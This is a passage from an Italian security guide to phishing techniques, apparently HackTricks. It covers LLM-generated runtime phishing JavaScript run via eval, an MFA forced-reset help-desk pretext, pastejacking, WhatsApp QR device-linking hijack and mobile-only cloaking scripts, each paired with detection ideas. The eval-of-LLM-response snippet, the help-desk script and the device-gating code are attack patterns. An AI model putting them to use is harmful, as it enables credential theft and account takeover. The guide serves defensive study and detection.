3. **Assemblaggio ed esecuzione:** concatenare la risposta ed eseguirla (polimorfica a ogni visita):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** il codice generato personalizza l’esca (es. parsing dei token LogoKit) e invia le credenziali all’endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; a volte usa WebSocket verso un backend.
- Nessun payload statico; il JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono stealer **unici** per ogni sessione.

**Idee per il rilevamento**
- Eseguire sandbox con JS abilitato; segnalare `eval` in fase di runtime o la creazione dinamica di script provenienti da risposte LLM.
- Cercare richieste POST dal front-end alle API LLM seguite immediatamente da `eval`/`Function` sul testo restituito.
- Generare avvisi per domini LLM non autorizzati nel traffico client, seguiti da richieste POST di credenziali.

---

## Variante MFA Fatigue / Push Bombing – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all’help desk, invalidando il token esistente dell’utente. Qualsiasi successiva richiesta di accesso appare legittima alla vittima.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **a pochi minuti di distanza dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli aggressori possono copiare di nascosto comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquattata, per poi indurre l’utente a incollarli in **Win + R**, **Win + X** o in una finestra di terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobile e distribuzione di app malevole (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Dirottamento del collegamento di un dispositivo WhatsApp tramite QR e ingegneria sociale
* Una pagina esca (ad es., un falso “canale” di un ministero/CERT) mostra un QR di WhatsApp Web/Desktop e invita la vittima a scansionarlo, aggiungendo di nascosto l’aggressore come **dispositivo collegato**.<sup>[[12]](#references)</sup>
* L’aggressore ottiene immediatamente visibilità su chat e contatti, finché la sessione non viene rimossa. In seguito, le vittime potrebbero visualizzare una notifica “nuovo dispositivo collegato”; i difensori possono cercare eventi di collegamento di dispositivi imprevisti avvenuti poco dopo le visite a pagine QR non attendibili.

### Phishing con accesso limitato ai dispositivi mobili per eludere crawler e sandbox
Gli operatori limitano sempre più spesso i loro flussi di phishing con un semplice controllo del dispositivo, così che i crawler desktop non raggiungano mai le pagine finali. Uno schema comune consiste in un piccolo script che verifica se il DOM supporta il touch e invia il risultato a un endpoint del server; i client non mobili ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobili viene mostrato il flusso completo.<sup>[[7]](#references)</sup>

Frammento client minimale (logica tipica):

```html
<script src="/static/detect_device.js"></script>
```

Logica di `detect_device.js` (semplificata):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione al primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un placeholder) alle GET successive quando `is_mobile=false`; mostra la pagina di phishing solo se `true`.

Euristiche per la ricerca e il rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobili; i percorsi legittimi delle vittime su dispositivi mobili restituiscono 200 con HTML/JS successivi.
- Bloccare o esaminare attentamente le pagine che mostrano contenuti esclusivamente in base a `ontouchstart` o controlli simili del dispositivo.

Suggerimenti per la difesa:
- Eseguire i crawler con impronte digitali simili a quelle dei dispositivi mobili e JavaScript abilitato, per rivelare i contenuti nascosti.
- Generare avvisi per risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## References

- [1] [Generare variazioni di dominio usate nel phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Individuare il phishing: strumenti e tecniche (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Rubare credenziali e aggirare la 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Rubare sessioni e aggirare la 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Come installare e configurare DKIM con Postfix su Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Rapporto globale Unit 42 sulla risposta agli incidenti 2025 – Edizione sul social engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastruttura di phishing con accesso limitato ai dispositivi mobili ed euristiche (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nuova frontiera degli attacchi di runtime assembly: uso degli LLM per generare JavaScript di phishing in tempo reale](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonificazione, click hijacking e TDS: dentro un ecosistema di distribuzione di malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting di Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Dirottamento del traffico diretto a windows.com di Microsoft tramite bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amore? In realtà: app di incontri falsa usata come esca in una campagna di spyware mirata in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC e campioni di ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Smascherare AdFection: come Discover-Tech ha trasformato gli annunci mirati in un canale per spyware mercenario zero-click](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
